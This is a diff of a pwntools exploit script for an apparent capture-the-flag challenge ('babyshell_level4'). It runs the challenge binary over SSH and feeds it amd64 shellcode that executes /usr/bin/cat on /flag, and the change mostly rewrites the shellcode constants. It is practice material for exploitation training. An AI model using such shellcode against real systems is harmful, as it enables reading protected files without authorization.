@@ -4,25 +4,14 @@ import re
 
 context.arch = 'amd64'
 
-
-def btos(n):
-    return n.decode('UTF-8')
-    
-s = ssh(host="pwn")
-f = SSHPath('/tmp/my_script.py', ssh=s)
-f.touch()
-f.write_text('import subprocess; subprocess.run("/challenge/babyshell_level4")')
-p = s.process(['python', '/tmp/my_script.py'])
-r = p.recvuntil(b"Reading 0x1000 bytes from stdin.")
-print(r.decode())
-
-shellcode="""
-push 0x7273752f
-push 0x6e69622f
-mov dword ptr [rsp+4], 0x7461632f  # b'/bin/cat'
+shellcode=f"""
+push {u32(b"/cat")} 
+push {u32(b"/usr")}  /* /usr */
+mov dword ptr [rsp+4], {u32(b"/bin")}  # b'/bin/cat'
 push rsp
 pop rdi
-push 0x616c662f
+push {u32(b"/fla")} 
+mov dword ptr [rsp+4], {u8(b"g")} 
 push rsp
 pop rsi
 push 0
@@ -43,7 +32,19 @@ shellcode=(asm(shellcode))
 
 
 print('1', disasm(shellcode))
-ELF.from_bytes(shellcode).debug()
+#ELF.from_bytes(shellcode).debug().interactive()
+
+
+def btos(n):
+    return n.decode('UTF-8')
+    
+s = ssh(host="pwn")
+f = SSHPath('/tmp/my_script.py', ssh=s)
+f.touch()
+f.write_text('import subprocess; subprocess.run("/challenge/babyshell_level4")')
+p = s.process(['python', '/tmp/my_script.py'])
+r = p.recvuntil(b"Reading 0x1000 bytes from stdin.")
+print(r.decode())
 
 
 shellcode=bytes(shellcode)
